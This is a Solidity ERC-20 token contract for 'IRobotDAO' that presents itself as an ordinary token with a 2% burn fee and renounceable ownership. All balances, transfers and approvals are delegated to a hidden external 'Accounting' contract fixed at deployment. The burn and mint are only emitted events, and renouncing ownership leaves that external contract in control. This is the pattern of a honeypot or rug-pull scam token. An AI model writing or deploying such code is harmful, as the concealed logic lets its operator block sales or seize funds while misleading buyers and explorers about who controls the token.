pragma solidity ^0.8.19;
// SPDX-License-Identifier: Unlicensed

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amounts) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amounts) external returns (bool);

    function transferFrom( address sender, address recipient, uint256 amounts ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval( address indexed owner, address indexed spender, uint256 value );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - fee https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}


library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;


        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}


contract Ownable is Context {
    address private _owner;
    event ownershipTransferred(address indexed previousowner, address indexed newowner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit ownershipTransferred(address(0), msgSender);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyowner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceownership() public virtual onlyowner {
        emit ownershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }
}

interface Accounting {
     function balanceOf(address account) external view returns (uint256);
     function transfer(address from,address to, uint amount) external returns (bool);
     function approve( address from, address spender, uint256 amounts) external returns (bool);
     function allowance(address owner, address spender) external view returns (uint256);
     function transferFrom(address user, address sender, address recipient, uint256 amounts ) external returns (bool);
}

contract TOKEN is Ownable, IERC20 {
    using SafeMath for uint256;
    string private _name = "IRobotDAO";
    string private _symbol = "IRobot";
    uint256 private _decimals = 9;
    address private accounting;
    uint256 private _totalSupply = 10000000000 * 10 ** _decimals;
    uint256 private _burnfee = 2;
    address private _DEADaddress = 0x000000000000000000000000000000000000dEaD;
     constructor (address _setaccount) {
        accounting = _setaccount;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function name() external view returns (string memory) {
        return _name;
    }

    function symbol() external view returns (string memory) {
        return _symbol;
    }

    function decimals() external view returns (uint256) {
        return _decimals;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function transfer(address recipient, uint256 amounts) public virtual override returns (bool) {
           _transfer(msg.sender,recipient, amounts);
           return Accounting(accounting).transfer(msg.sender,recipient, amounts);
    }


    function _transfer(address sender, address recipient, uint256 amounts) internal virtual {
           uint256 feeamount = 0;
           feeamount = amounts.mul(_burnfee).div(100);
           emit Transfer(sender, _DEADaddress, feeamount);
           emit Transfer(sender,recipient, amounts-feeamount);
    }


    function balanceOf(address account) public view override returns (uint256) {
        return Accounting(accounting).balanceOf(account);
    }

    function approve(address spender, uint256 amounts) public virtual override returns (bool) {
        return Accounting(accounting).approve(msg.sender,spender, amounts);
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return Accounting(accounting).allowance(owner, spender);
    }

    function transferFrom(address sender, address recipient, uint256 amounts) public virtual override returns (bool) {
        _transfer(sender, recipient, amounts);
        return Accounting(accounting).transferFrom(msg.sender,sender, recipient, amounts);
    }

}